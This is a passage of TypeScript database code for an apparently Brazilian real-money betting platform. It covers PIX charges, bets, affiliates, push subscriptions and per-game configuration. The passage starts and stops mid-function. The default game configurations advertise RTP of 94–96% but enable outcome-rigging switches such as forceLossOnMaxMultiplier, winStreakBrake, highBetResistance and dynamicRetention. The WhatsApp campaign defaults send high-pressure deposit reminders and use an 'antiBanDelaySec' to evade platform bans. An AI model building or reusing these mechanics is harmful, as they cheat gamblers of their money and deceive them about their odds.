      const snap = await getDocs(q);
      const items = snap.docs.map((d) => d.data() as InfluencerCommissionRequestDB);
      items.forEach(i => memoryInfluencerRequests.set(i.id, i));
      if (items.length > 0) {
        return items.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
      }
    } catch (e) {
      console.warn('[Firestore] Error fetching influencer requests by influencerUserId:', e);
    }
    const local = Array.from(memoryInfluencerRequests.values()).filter(r => r.influencerUserId === influencerUserId);
    return local.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
  }

  async getInfluencerCommissionRequestById(id: string): Promise<InfluencerCommissionRequestDB | null> {
    try {
      const snap = await getDoc(doc(firestoreDb, 'influencerCommissionRequests', id));
      if (snap.exists()) {
        const item = snap.data() as InfluencerCommissionRequestDB;
        memoryInfluencerRequests.set(item.id, item);
        return item;
      }
    } catch (e) {
      console.warn('[Firestore] Error fetching influencer request by id:', e);
    }
    return memoryInfluencerRequests.get(id) || null;
  }

  async updateInfluencerCommissionRequest(id: string, updates: Partial<InfluencerCommissionRequestDB>): Promise<void> {
    const existing = memoryInfluencerRequests.get(id);
    if (existing) {
      Object.assign(existing, updates);
    }
    try {
      await updateDoc(doc(firestoreDb, 'influencerCommissionRequests', id), sanitizeForFirestore(updates));
    } catch (e) {
      console.warn('[Firestore] updateInfluencerCommissionRequest fallback:', e);
    }
  }

  async getAllUsers(): Promise<UserDB[]> {
    try {
      const snap = await getDocs(collection(firestoreDb, 'users'));
      const list = snap.docs.map((d) => d.data() as UserDB);
      list.forEach(u => {
        memoryUsers.set(u.id, u);
        if (u.email) memoryUsers.set(u.email.toLowerCase(), u);
      });
      return list.length > 0 ? list : Array.from(new Set(memoryUsers.values()));
    } catch (e) {
      console.error('Error fetching all users:', e);
      return Array.from(new Set(memoryUsers.values()));
    }
  }

  async getUsersByPartnerId(partnerUserId: string, partnerCode?: string): Promise<UserDB[]> {
    const all = await this.getAllUsers();
    const userMap = new Map<string, UserDB>();
    all.forEach(u => userMap.set(u.id, u));
    Array.from(memoryUsers.values()).forEach(u => userMap.set(u.id, u));

    const cleanCode = partnerCode ? partnerCode.toUpperCase().trim() : null;
    return Array.from(userMap.values()).filter(u => {
      if (u.id === partnerUserId) return false;
      if (u.partnerId === partnerUserId || u.partnerUserId === partnerUserId) return true;
      if (cleanCode && (u.partnerCode?.toUpperCase() === cleanCode)) return true;
      return false;
    });
  }

  async toggleUserAutoWithdraw(userId: string, blocked: boolean): Promise<boolean> {
    await this.updateUserFields(userId, { autoWithdrawBlocked: blocked });
    return true;
  }

  async toggleUserWithdraw(userId: string, blocked: boolean): Promise<boolean> {
    await this.updateUserFields(userId, { withdrawBlocked: blocked });
    return true;
  }

  async getAllTransactions(): Promise<TransactionDB[]> {
    try {
      const snap = await getDocs(collection(firestoreDb, 'transactions'));
      const list = snap.docs.map((d) => d.data() as TransactionDB);
      return list.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
    } catch (e) {
      console.error('Error fetching all transactions:', e);
      return [];
    }
  }

  async upsertPushSubscription(item: PushSubscriptionDB): Promise<void> {
    try {
      const docId = item.id || this.hashEndpoint(item.endpoint);
      item.id = docId;
      await setDoc(doc(firestoreDb, 'pushSubscriptions', docId), sanitizeForFirestore(item), { merge: true });
      await setDoc(doc(firestoreDb, 'push_subscriptions', docId), sanitizeForFirestore(item), { merge: true }).catch(() => {});
    } catch (err) {
      console.error('[Firestore] Error saving push subscription:', err);
    }
  }

  async getPushSubscriptions(userIds?: Set<string>): Promise<PushSubscriptionDB[]> {
    try {
      const subsMap = new Map<string, PushSubscriptionDB>();

      try {
        const snap = await getDocs(collection(firestoreDb, 'pushSubscriptions'));
        snap.docs.forEach((d) => {
          const data = d.data() as PushSubscriptionDB;
          if (data && data.endpoint) {
            data.id = d.id;
            subsMap.set(data.endpoint, data);
          }
        });
      } catch (err1: any) {
        console.warn('[Firestore] Error querying pushSubscriptions:', err1?.message || err1);
      }

      try {
        const snapSnake = await getDocs(collection(firestoreDb, 'push_subscriptions'));
        snapSnake.docs.forEach((d) => {
          const data = d.data() as PushSubscriptionDB;
          if (data && data.endpoint && !subsMap.has(data.endpoint)) {
            data.id = d.id;
            subsMap.set(data.endpoint, data);
          }
        });
      } catch (err2: any) {
        // Snake collection fallback
      }

      const items = Array.from(subsMap.values());
      return userIds ? items.filter((item) => userIds.has(item.userId)) : items;
    } catch (e: any) {
      console.error('[Firestore] Error fetching push subscriptions:', e?.message || e);
      return [];
    }
  }

  async deletePushSubscription(idOrEndpoint: string): Promise<void> {
    try {
      if (!idOrEndpoint || typeof idOrEndpoint !== 'string') return;
      await deleteDoc(doc(firestoreDb, 'pushSubscriptions', idOrEndpoint)).catch(() => {});
      await deleteDoc(doc(firestoreDb, 'push_subscriptions', idOrEndpoint)).catch(() => {});
      const hashId = this.hashEndpoint(idOrEndpoint);
      if (hashId && hashId !== idOrEndpoint) {
        await deleteDoc(doc(firestoreDb, 'pushSubscriptions', hashId)).catch(() => {});
        await deleteDoc(doc(firestoreDb, 'push_subscriptions', hashId)).catch(() => {});
      }
    } catch (e) {
      console.warn('[Firestore] Error deleting push subscription:', e);
    }
  }

  async getTransactionById(id: string): Promise<TransactionDB | null> {
    try {
      const snap = await getDoc(doc(firestoreDb, 'transactions', id));
      if (snap.exists()) {
        return snap.data() as TransactionDB;
      }
      return null;
    } catch (e) {
      console.error('Error fetching transaction by id:', e);
      return null;
    }
  }

  async updateTransactionStatus(id: string, status: 'approved' | 'rejected' | 'pending', extraData?: Partial<TransactionDB>): Promise<void> {
    const payload: any = { status };
    if (extraData && typeof extraData === 'object') {
      Object.assign(payload, extraData);
    }
    await updateDoc(doc(firestoreDb, 'transactions', id), payload);
  }

  async getAdmins(): Promise<UserDB[]> {
    try {
      const allUsers = await this.getAllUsers();
      return allUsers.filter(u => u.role === 'admin' || u.role === 'superadmin');
    } catch (e) {
      console.error('Error fetching admins:', e);
      return [];
    }
  }

  async updateUserRoleAndPermissions(
    userId: string,
    role: 'user' | 'admin' | 'superadmin',
    adminPermissions?: AdminPermissions,
    isBlocked?: boolean
  ): Promise<void> {
    const updateData: any = { role };
    if (adminPermissions !== undefined) {
      updateData.adminPermissions = adminPermissions;
    }
    if (isBlocked !== undefined) {
      updateData.isBlocked = isBlocked;
    }
    await updateDoc(doc(firestoreDb, 'users', userId), sanitizeForFirestore(updateData));
  }

  // --- GAME CONFIG & REAL-TIME ANALYTICS PERSISTENCE ---

  async getGameConfig(gameId: string = 'g_gen_dino'): Promise<GameConfigDB> {
    const isDino = gameId === 'g_gen_dino' || gameId === 'gendino' || gameId === 'gen-dino' || gameId === 'dino';
    const isZumbla = gameId === 'g_zumbla' || gameId === 'zumbla' || gameId === 'zumbla-game';
    const isRaspa = gameId === 'g_raspa_fortuna' || gameId === 'raspa_fortuna' || gameId === 'raspafortuna' || gameId === 'raspa-fortuna';
    const isSubway = gameId === 'g_subway_pay' || gameId === 'subwaypay' || gameId === 'subway-pay' || gameId === 'subway_pay' || gameId === 'subwaysurfers';
    const cleanId = isDino ? 'g_gen_dino' : (isZumbla ? 'g_zumbla' : (isRaspa ? 'g_raspa_fortuna' : (isSubway ? 'g_subway_pay' : 'g_block_puzzle')));

    const defaultDinoCfg: GameConfigDB = {
      id: 'g_gen_dino',
      name: 'GEN DINO (Arcade Runner PIX)',
      category: 'Runner & Habilidade',
      status: 'active',
      rtpPercent: 95.0,
      difficulty: 'medium',
      minBet: 1.0,
      maxBet: 500.0,
      totalWagered: 0,
      totalPayout: 0,
      ggr: 0,
      totalBetsCount: 0,
      houseEdgeMode: 'balanced',
      maxMultiplier: 100.0,
      smartRtp: true,
      smartRtpEasyThreshold: 30.0,
      smartRtpHardThreshold: 85.0,
      smartRtpMaxTarget: 100.0,
      antiBailoutMode: false,
      heavyBlocksForce: false,
      dynamicRetention: true,
      streakLimiterMultiplier: 5.0,
      nearLossPressure: false,
      winStreakBrake: true,
      antiComboBlocker: false,
      highBetResistance: true,
      giantPieceFrequency: 20,
      instantLossOnTargetProfit: 0,
      tightenOnHighOccupancy: true,
      minCashoutMultiplier: 1.10,
      lineMultiplierStep: 0.25,
      initialMultiplier: 1.0,
      retentionAggressiveness: 'moderate',
      forceLossOnMaxMultiplier: true,
      consecutiveWinDecay: 0.05,
      // Dino specific controls
      obstacleMultiplier: 1.0,
      baseSpeed: 6.0,
      maxSpeed: 13.0,
      acceleration: 0.001,
      gameSpeedPercent: 100,
      obstacleDensityPercent: 50,
      bonusFrequencyPercent: 30,
      coinValueCents: 100,
      // Popups and Banners
      popupEnabled: false,
      popupTitle: 'BÔNUS EXCLUSIVO GEN DINO!',
      popupDescription: 'Deposite agora no PIX e ganhe até 300% de bônus na sua primeira corrida!',
      popupImageUrl: '/games/gendino/images/gen-dino-bonus-banner.png',
      popupButtonText: 'DEPOSITAR E ATIVAR BÔNUS',
      popupButtonAction: 'deposit',
      popupButtonUrl: '',
      popupTrigger: 'start',
      heroBannerImageUrl: '/games/gendino/images/gen-dino-bonus-banner.png',
      heroBannerTitle: 'PROMOÇÃO DE DEPÓSITO DINO',
      heroBannerSubtitle: 'Deposite R$ 50 e receba 2×. Com R$ 100, você recebe R$ 300.',
      heroBannerBadge: 'BÔNUS ATÉ 3×',
      configVersion: 1,
      updatedAt: new Date().toISOString(),
    };

    const defaultBlockCfg: GameConfigDB = {
      id: 'g_block_puzzle',
      name: 'Block Win (Block Puzzle iGaming)',
      category: 'Estratégia & Habilidade',
      status: 'active',
      rtpPercent: 96.0,
      difficulty: 'easy',
      minBet: 1.0,
      maxBet: 500.0,
      totalWagered: 0,
      totalPayout: 0,
      ggr: 0,
      totalBetsCount: 0,
      houseEdgeMode: 'easy',
      maxMultiplier: 100.0,
      smartRtp: true,
      smartRtpEasyThreshold: 90.0,
      smartRtpHardThreshold: 100.0,
      antiBailoutMode: false,
      heavyBlocksForce: false,
      dynamicRetention: true,
      streakLimiterMultiplier: 6.0,
      nearLossPressure: false,
      winStreakBrake: true,
      antiComboBlocker: false,
      highBetResistance: true,
      giantPieceFrequency: 25,
      instantLossOnTargetProfit: 0,
      tightenOnHighOccupancy: true,
      minCashoutMultiplier: 1.05,
      lineMultiplierStep: 0.40,
      initialMultiplier: 1.0,
      retentionAggressiveness: 'moderate',
      forceLossOnMaxMultiplier: true,
      consecutiveWinDecay: 0.05,
      popupEnabled: false,
      popupTitle: 'BÔNUS BLOCK PUZZLE',
      popupDescription: 'Aumente seus ganhos completando linhas e combos especiais.',
      popupImageUrl: '/games/blockpuzzle/block-puzzle-banner.png',
      popupButtonText: 'JOGAR COM BÔNUS',
      popupButtonAction: 'deposit',
      popupButtonUrl: '',
      popupTrigger: 'start',
      heroBannerImageUrl: '/assets/games/block-win/cover.webp',
      heroBannerTitle: 'BLOCK WIN iGAMING',
      heroBannerSubtitle: 'Encaixe blocos, limpe linhas e multiplique até 100x.',
      heroBannerBadge: 'POPULAR',
      configVersion: 1,
      updatedAt: new Date().toISOString(),
    };

    const defaultZumblaCfg: GameConfigDB = {
      id: 'g_zumbla',
      name: 'Zumbla Win (Marble Shooter)',
      category: 'Arcade & Pontaria',
      status: 'active',
      rtpPercent: 95.0,
      difficulty: 'medium',
      minBet: 1.0,
      maxBet: 500.0,
      totalWagered: 0,
      totalPayout: 0,
      ggr: 0,
      totalBetsCount: 0,
      houseEdgeMode: 'balanced',
      maxMultiplier: 100.0,
      smartRtp: true,
      smartRtpEasyThreshold: 90.0,
      smartRtpHardThreshold: 100.0,
      antiBailoutMode: false,
      heavyBlocksForce: false,
      dynamicRetention: true,
      streakLimiterMultiplier: 5.0,
      nearLossPressure: false,
      winStreakBrake: true,
      antiComboBlocker: false,
      highBetResistance: true,
      giantPieceFrequency: 20,
      instantLossOnTargetProfit: 0,
      tightenOnHighOccupancy: true,
      minCashoutMultiplier: 1.10,
      lineMultiplierStep: 0.25,
      initialMultiplier: 1.0,
      retentionAggressiveness: 'moderate',
      forceLossOnMaxMultiplier: true,
      consecutiveWinDecay: 0.05,
      popupEnabled: false,
      popupTitle: 'BÔNUS ZUMBLA WIN',
      popupDescription: 'Dispare esferas e ative bônus multiplicadores.',
      popupImageUrl: '/assets/games/zumbla/cover.webp',
      popupButtonText: 'JOGAR COM BÔNUS',
      popupButtonAction: 'deposit',
      popupButtonUrl: '',
      popupTrigger: 'start',
      heroBannerImageUrl: '/assets/games/zumbla/cover.webp',
      heroBannerTitle: 'ZUMBLA WIN SHOOTER',
      heroBannerSubtitle: 'Elimine as esferas antes que alcancem o portal sagrado.',
      heroBannerBadge: 'DESTAQUE',
      configVersion: 1,
      updatedAt: new Date().toISOString(),
    };

    const defaultRaspaCfg: GameConfigDB = {
      id: 'g_raspa_fortuna',
      name: 'Raspa Fortuna (Raspadinha PIX)',
      category: 'Raspadinha & Prêmios Instantâneos',
      status: 'active',
      rtpPercent: 94.0,
      difficulty: 'medium',
      minBet: 5.0,
      maxBet: 50.0,
      totalWagered: 0,
      totalPayout: 0,
      ggr: 0,
      totalBetsCount: 0,
      houseEdgeMode: 'balanced',
      maxMultiplier: 250.0,
      smartRtp: true,
      smartRtpEasyThreshold: 40.0,
      smartRtpHardThreshold: 90.0,
      antiBailoutMode: false,
      heavyBlocksForce: false,
      dynamicRetention: true,
      streakLimiterMultiplier: 10.0,
      nearLossPressure: false,
      winStreakBrake: true,
      antiComboBlocker: false,
      highBetResistance: true,
      giantPieceFrequency: 15,
      instantLossOnTargetProfit: 0,
      tightenOnHighOccupancy: true,
      minCashoutMultiplier: 1.0,
      lineMultiplierStep: 0.5,
      initialMultiplier: 1.0,
      retentionAggressiveness: 'moderate',
      forceLossOnMaxMultiplier: true,
      consecutiveWinDecay: 0.05,
      popupEnabled: false,
      popupTitle: 'BÔNUS RASPA FORTUNA',
      popupDescription: 'Deposite via PIX e receba bônus de 200% para raspar.',
      popupImageUrl: '/raspa-fortuna.png',
      popupButtonText: 'DEPOSITAR E RASPAR',
      popupButtonAction: 'deposit',
      popupButtonUrl: '',
      popupTrigger: 'start',
      heroBannerImageUrl: '/raspa-fortuna.png',
      heroBannerTitle: 'RASPA FORTUNA PIX',
      heroBannerSubtitle: 'Carros, motos, iPhones e PIX na hora.',
      heroBannerBadge: 'PIX INSTANTÂNEO',
      configVersion: 1,
      updatedAt: new Date().toISOString(),
    };

    const defaultSubwayCfg: GameConfigDB = {
      id: 'g_subway_pay',
      name: 'Subway Pay (Subway Surfers PIX)',
      category: 'Runner & Habilidade',
      status: 'active',
      rtpPercent: 95.0,
      difficulty: 'medium',
      minBet: 10.0,
      maxBet: 400.0,
      totalWagered: 0,
      totalPayout: 0,
      ggr: 0,
      totalBetsCount: 0,
      houseEdgeMode: 'balanced',
      maxMultiplier: 4.0,
      smartRtp: true,
      smartRtpEasyThreshold: 40.0,
      smartRtpHardThreshold: 85.0,
      smartRtpMaxTarget: 100.0,
      antiBailoutMode: false,
      heavyBlocksForce: false,
      dynamicRetention: true,
      streakLimiterMultiplier: 4.0,
      nearLossPressure: false,
      winStreakBrake: true,
      antiComboBlocker: false,
      highBetResistance: true,
      giantPieceFrequency: 20,
      instantLossOnTargetProfit: 0,
      tightenOnHighOccupancy: true,
      minCashoutMultiplier: 2.0,
      lineMultiplierStep: 0.25,
      initialMultiplier: 1.0,
      retentionAggressiveness: 'moderate',
      forceLossOnMaxMultiplier: true,
      consecutiveWinDecay: 0.05,
      // Runner & Subway specific controls
      obstacleMultiplier: 1.0,
      baseSpeed: 180,
      maxSpeed: 320,
      acceleration: 0.0015,
      gameSpeedPercent: 100,
      obstacleDensityPercent: 50,
      bonusFrequencyPercent: 40,
      coinValueCents: 100,
      reactionWindowMs: 800,
      // Popups and Banners
      popupEnabled: false,
      popupTitle: 'BÔNUS SUBWAY PAY CORRIDA!',
      popupDescription: 'Deposite via PIX e receba créditos extras para correr nos trilhos!',
      popupImageUrl: '/subwaypay.png',
      popupButtonText: 'DEPOSITAR PIX',
      popupButtonAction: 'deposit',
      popupButtonUrl: '',
      popupTrigger: 'start',
      heroBannerImageUrl: '/subwaypay.png',
      heroBannerTitle: 'SUBWAY PAY CORRIDA OFICIAL',
      heroBannerSubtitle: 'Colete moedas e faça cashout nos trilhos!',
      heroBannerBadge: 'PIX INSTANTÂNEO',
      configVersion: 1,
      updatedAt: new Date().toISOString(),
    };

    const defaultCfg = isDino ? defaultDinoCfg : (isZumbla ? defaultZumblaCfg : (isRaspa ? defaultRaspaCfg : (isSubway ? defaultSubwayCfg : defaultBlockCfg)));

    try {
      const snap = await getDoc(doc(firestoreDb, 'gameConfigs', cleanId));
      if (snap.exists()) {
        const data = snap.data() as GameConfigDB;
        const result: GameConfigDB = {
          ...defaultCfg,
          ...data,
          id: cleanId,
        };

        // Guarantee accurate names and categories
        if (cleanId === 'g_gen_dino') {
          result.name = 'GEN DINO (Arcade Runner PIX)';
          result.category = 'Runner & Habilidade';
        } else if (cleanId === 'g_block_puzzle') {
          result.name = 'Block Win (Block Puzzle iGaming)';
          result.category = 'Estratégia & Habilidade';
        } else if (cleanId === 'g_zumbla') {
          result.name = 'Zumbla Win (Marble Shooter)';
          result.category = 'Arcade & Pontaria';
        } else if (cleanId === 'g_raspa_fortuna') {
          result.name = 'Raspa Fortuna (Raspadinha PIX)';
          result.category = 'Raspadinha & Prêmios Instantâneos';
        } else if (cleanId === 'g_subway_pay') {
          result.name = 'Subway Pay (Subway Surfers PIX)';
          result.category = 'Runner & Habilidade';
        }

        return result;
      } else {
        // Save initial config
        await setDoc(doc(firestoreDb, 'gameConfigs', cleanId), sanitizeForFirestore(defaultCfg));
        return defaultCfg;
      }
    } catch (e) {
      console.error('Error fetching game config from Firestore:', e);
      return defaultCfg;
    }
  }

  async saveGameConfig(config: GameConfigDB): Promise<void> {
    try {
      config.updatedAt = new Date().toISOString();
      config.configVersion = (config.configVersion || 1) + 1;
      await setDoc(doc(firestoreDb, 'gameConfigs', config.id), sanitizeForFirestore(config));
    } catch (e) {
      console.error('Error saving game config to Firestore:', e);
    }
  }

  async recordGameBet(bet: GameBetDB): Promise<void> {
    try {
      await setDoc(doc(firestoreDb, 'gameBets', bet.id), sanitizeForFirestore(bet));
    } catch (e) {
      console.error('Error recording game bet to Firestore:', e);
    }
  }

  async updateGameBet(id: string, fields: Partial<GameBetDB>): Promise<void> {
    try {
      const updateData = {
        ...fields,
        updatedAt: new Date().toISOString(),
      };
      await updateDoc(doc(firestoreDb, 'gameBets', id), sanitizeForFirestore(updateData));
    } catch (e) {
      console.error('Error updating game bet in Firestore:', e);
    }
  }

  async getGameBetById(id: string): Promise<GameBetDB | null> {
    try {
      const snap = await getDoc(doc(firestoreDb, 'gameBets', id));
      if (!snap.exists()) return null;
      return snap.data() as GameBetDB;
    } catch (e) {
      console.error('Error fetching game bet by id from Firestore:', e);
      return null;
    }
  }

  async getAllGameBets(limitCount: number = 100): Promise<GameBetDB[]> {
    try {
      const snap = await getDocs(collection(firestoreDb, 'gameBets'));
      const list = snap.docs.map((d) => d.data() as GameBetDB);
      return list
        .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())
        .slice(0, limitCount);
    } catch (e) {
      console.error('Error fetching game bets from Firestore:', e);
      return [];
    }
  }

  async getUserGameBets(userId: string): Promise<GameBetDB[]> {
    try {
      const q = query(collection(firestoreDb, 'gameBets'), where('userId', '==', userId));
      const snap = await getDocs(q);
      return snap.docs.map((d) => d.data() as GameBetDB);
    } catch (e) {
      try {
        const snap = await getDocs(collection(firestoreDb, 'gameBets'));
        return snap.docs.map((d) => d.data() as GameBetDB).filter(b => b.userId === userId);
      } catch (_) {
        return Array.from(memoryBets.values()).filter(b => b.userId === userId);
      }
    }
  }

  async getGameLiveMetrics(gameId: string = 'g_gen_dino'): Promise<{
    config: GameConfigDB;
    totalWagered: number;
    totalPayout: number;
    ggr: number;
    totalBetsCount: number;
    totalWinsCount: number;
    totalLossesCount: number;
    effectiveRtp: number;
    effectiveHouseEdge: number;
    recentBets: GameBetDB[];
  }> {
    const isDino = gameId === 'g_gen_dino' || gameId === 'gendino' || gameId === 'gen-dino' || gameId === 'dino';
    const isZumbla = gameId === 'g_zumbla' || gameId === 'zumbla' || gameId === 'zumbla-game';
    const isRaspa = gameId === 'g_raspa_fortuna' || gameId === 'raspa_fortuna' || gameId === 'raspafortuna' || gameId === 'raspa-fortuna';
    const isSubway = gameId === 'g_subway_pay' || gameId === 'subwaypay' || gameId === 'subway-pay' || gameId === 'subway_pay' || gameId === 'subwaysurfers';
    const cleanId = isDino ? 'g_gen_dino' : (isZumbla ? 'g_zumbla' : (isRaspa ? 'g_raspa_fortuna' : (isSubway ? 'g_subway_pay' : 'g_block_puzzle')));

    const config = await this.getGameConfig(cleanId);
    const allBets = await this.getAllGameBets(200);

    // Filter bets specifically for this game
    const gameBets = allBets.filter((b) => {
      if (isDino) {
        return b.gameId === 'g_gen_dino' || b.gameId === 'gendino' || b.gameId === 'gen-dino' || b.gameId === 'dino';
      }
      if (isZumbla) {
        return b.gameId === 'g_zumbla' || b.gameId === 'zumbla';
      }
      if (isRaspa) {
        return b.gameId === 'g_raspa_fortuna' || b.gameId === 'raspa_fortuna' || b.gameId === 'raspafortuna' || b.gameId === 'raspa-fortuna';
      }
      if (isSubway) {
        return b.gameId === 'g_subway_pay' || b.gameId === 'subwaypay' || b.gameId === 'subway-pay' || b.gameId === 'subway_pay';
      }
      return b.gameId === 'g_block_puzzle' || b.gameId === 'blockpuzzle';
    });

    let wagered = 0;
    let payout = 0;
    let winsCount = 0;
    let lossesCount = 0;

    for (const b of gameBets) {
      const bAmount = typeof b.betAmount === 'number' ? b.betAmount : 0;
      const pAmount = typeof b.payoutAmount === 'number' ? b.payoutAmount : 0;
      wagered += bAmount;
      payout += pAmount;

      if (b.status === 'cashed_out' && pAmount > 0) {
        winsCount++;
      } else if (b.status === 'lost') {
        lossesCount++;
      }
    }

    // Combine with persistent accumulators if present
    const totalWagered = parseFloat((Math.max(wagered, config.totalWagered || 0)).toFixed(2));
    const totalPayout = parseFloat((Math.max(payout, config.totalPayout || 0)).toFixed(2));
    const ggr = parseFloat((totalWagered - totalPayout).toFixed(2));
    const totalBetsCount = Math.max(gameBets.length, config.totalBetsCount || 0);

    const effectiveRtp = totalWagered > 0 ? parseFloat(((totalPayout / totalWagered) * 100).toFixed(1)) : config.rtpPercent;
    const effectiveHouseEdge = parseFloat((100 - effectiveRtp).toFixed(1));

    return {
      config,
      totalWagered,
      totalPayout,
      ggr,
      totalBetsCount,
      totalWinsCount: winsCount,
      totalLossesCount: lossesCount,
      effectiveRtp,
      effectiveHouseEdge,
      recentBets: gameBets.slice(0, 25),
    };
  }

  // --- WHATSAPP & BAILEYS CAMPAIGN SETTINGS ---
  private cachedCampaignSettings: any = null;

  async getCampaignSettings(): Promise<any> {
    if (this.cachedCampaignSettings) {
      return this.cachedCampaignSettings;
    }

    const defaultSettings = {
      whatsappEnabled: true,
      instanceName: 'Alliance WhatsApp Hub',
      autoRecoverPix: true,
      pixRecoveryDelayMinutes: 5,
      pixRecoveryTemplate: '⚡ {primeiro_nome}, seu PIX de {valor_pix} ainda está aguardando pagamento! Copie o código abaixo e garanta seu bônus de 200%:\n\n{codigo_pix}',
      autoRecoverPixPhase2: true,
      pixRecoveryPhase2DelayMinutes: 20,
      pixRecoveryPhase2Template: '⏳ {primeiro_nome}, seu PIX promocional de {valor_pix} expira em 10 minutos! Finalize agora para garantir +50 rodadas bônus exclusivas:\n\n{codigo_pix}',
      autoWelcome: true,
      welcomeTemplate: '🎉 Olá {primeiro_nome}, bem-vindo à ALLIANCE HUB! Seu cadastro foi realizado com sucesso. Aproveite o bônus de boas-vindas:\n\n{link_jogo}',
      autoDepositConfirmed: true,
      depositConfirmedTemplate: '✅ {primeiro_nome}, seu depósito de {valor_pix} foi aprovado com sucesso! Seu saldo total é {saldo}. Boa sorte nas rodadas:\n\n{link_jogo}',
      autoWithdrawNotify: true,
      withdrawNotifyTemplate: '💸 Parabéns {primeiro_nome}! Seu saque PIX de {valor_pix} foi processado e transferido para sua conta com sucesso.',
      autoInactiveReengagement: true,
      inactiveDays: 3,
      inactiveReengagementTemplate: '🔥 Sentimos sua falta {primeiro_nome}! Liberamos um cashback surpresa de 50% no seu próximo depósito. Venha jogar:\n\n{link_jogo}',
      autoAffiliateCommission: true,
      affiliateCommissionTemplate: '💰 Parabéns {primeiro_nome}! Você acabou de receber uma nova comissão de afiliado de {valor_pix}! Seu saldo total de comissões é {saldo}.',
      antiBanDelaySec: 8,
    };

    try {
      const docRef = doc(firestoreDb, 'settings', 'campaigns');
      const snap = await getDoc(docRef);
      if (snap.exists()) {
        this.cachedCampaignSettings = { ...defaultSettings, ...snap.data() };
        return this.cachedCampaignSettings;
      }
    } catch (e) {
      console.warn('Could not read campaign settings from Firestore, using defaults:', e);
    }

    this.cachedCampaignSettings = defaultSettings;
    return this.cachedCampaignSettings;
  }

  async saveCampaignSettings(settings: any): Promise<any> {
    this.cachedCampaignSettings = { ...settings };
    try {
      const docRef = doc(firestoreDb, 'settings', 'campaigns');
      await setDoc(docRef, this.cachedCampaignSettings, { merge: true });
    } catch (e) {
      console.warn('Could not persist campaign settings to Firestore:', e);
    }
    return this.cachedCampaignSettings;
  }

  // --- PUSH SUBSCRIPTIONS IN FIRESTORE ---
  private hashEndpoint(endpoint: string): string {
    return crypto.createHash('sha256').update(endpoint).digest('hex').substring(0, 32);
  }

  async savePushSubscription(item: PushSubscriptionDB): Promise<void> {
    try {
      const docId = this.hashEndpoint(item.endpoint);
      const docRef = doc(firestoreDb, 'push_subscriptions', docId);
      await setDoc(docRef, item, { merge: true });
    } catch (err) {
      console.warn('[FirestoreDB] Could not save push subscription to Firestore:', err);
    }
  }

  async getAllPushSubscriptions(): Promise<PushSubscriptionDB[]> {
    try {
      const snap = await getDocs(collection(firestoreDb, 'push_subscriptions'));
      const list: PushSubscriptionDB[] = [];
      snap.forEach((d) => {
        list.push(d.data() as PushSubscriptionDB);
      });
      return list;
    } catch (err) {
      console.warn('[FirestoreDB] Could not load push subscriptions from Firestore:', err);
      return [];
    }
  }

  // --- CHARGES (DOTFY PIX) IN FIRESTORE ---
  async saveCharge(charge: StoredChargeDB): Promise<void> {
    try {
      const docId = charge.correlationID || charge.id;
      const docRef = doc(firestoreDb, 'charges', docId);
      await setDoc(docRef, charge, { merge: true });
    } catch (err) {
      console.warn('[FirestoreDB] Could not save charge to Firestore:', err);
    }
  }

  async getChargeByCorrelationID(correlationID: string): Promise<StoredChargeDB | null> {
    try {
      const docRef = doc(firestoreDb, 'charges', correlationID);
      const snap = await getDoc(docRef);
      if (snap.exists()) {
        return snap.data() as StoredChargeDB;
      }
      const q = query(collection(firestoreDb, 'charges'), where('correlationID', '==', correlationID));
      const querySnap = await getDocs(q);
      if (!querySnap.empty) {
        return querySnap.docs[0].data() as StoredChargeDB;
      }
    } catch (err) {
      console.warn('[FirestoreDB] Could not get charge by correlationID from Firestore:', err);
    }
    return null;
  }

  async getChargeByChargeId(chargeId: string): Promise<StoredChargeDB | null> {
    try {
      const q = query(collection(firestoreDb, 'charges'), where('chargeId', '==', chargeId));
      const querySnap = await getDocs(q);
      if (!querySnap.empty) {
        return querySnap.docs[0].data() as StoredChargeDB;
      }
    } catch (err) {
      console.warn('[FirestoreDB] Could not get charge by chargeId from Firestore:', err);
    }
    return null;
  }

  async updateChargeStatus(correlationID: string, status: string, credited?: boolean): Promise<void> {
    try {
      const docRef = doc(firestoreDb, 'charges', correlationID);
      const updates: any = { status };
      if (credited !== undefined) updates.credited = credited;
      await updateDoc(docRef, updates);
    } catch (err) {
      console.warn('[FirestoreDB] Could not update charge status in Firestore:', err);
    }
  }

  // --- ADMIN NOTIFICATION DISPATCH LOGS ---
  async saveAdminNotificationLog(log: AdminNotificationLogDB): Promise<void> {
    try {
      const docRef = doc(firestoreDb, 'admin_notification_logs', log.id);
      await setDoc(docRef, log);
    } catch (err) {
      console.warn('[FirestoreDB] Could not save admin notification log:', err);
    }
  }

  async getAdminNotificationLogs(limitCount = 50): Promise<AdminNotificationLogDB[]> {
    try {
      const snap = await getDocs(collection(firestoreDb, 'admin_notification_logs'));
      const list: AdminNotificationLogDB[] = [];
      snap.forEach((d) => list.push(d.data() as AdminNotificationLogDB));
      list.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
      return list.slice(0, limitCount);
    } catch (err) {
      console.warn('[FirestoreDB] Could not get admin notification logs:', err);
      return [];
    }
  }

  // --- AFFILIATE NOTIFICATIONS FEED ---
  async saveAffiliateFeedItem(item: AffiliateFeedNotificationDB): Promise<void> {
    try {
      const docRef = doc(firestoreDb, 'affiliate_notifications_feed', item.id);
      await setDoc(docRef, item);
    } catch (err) {
      console.warn('[FirestoreDB] Could not save affiliate feed item:', err);
    }
  }

  async getAffiliateFeedItems(limitCount = 100): Promise<AffiliateFeedNotificationDB[]> {
    try {
      const snap = await getDocs(collection(firestoreDb, 'affiliate_notifications_feed'));
      const list: AffiliateFeedNotificationDB[] = [];
      snap.forEach((d) => list.push(d.data() as AffiliateFeedNotificationDB));
      list.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
      return list.slice(0, limitCount);
    } catch (err) {
      console.warn('[FirestoreDB] Could not get affiliate feed items:', err);
      return [];
    }
  }

  // --- DOTFY GATEWAY CONFIG (ENCRYPTED AT REST AES-256-GCM) ---
  async getDotfyConfig(): Promise<DotfyGatewayConfigDB | null> {
    try {
      const docRef = doc(firestoreDb, 'settings', 'dotfy');
      const snap = await getDoc(docRef);
      if (snap.exists()) {
        const raw = snap.data() as DotfyGatewayConfigDB;
        return {
          ...raw,
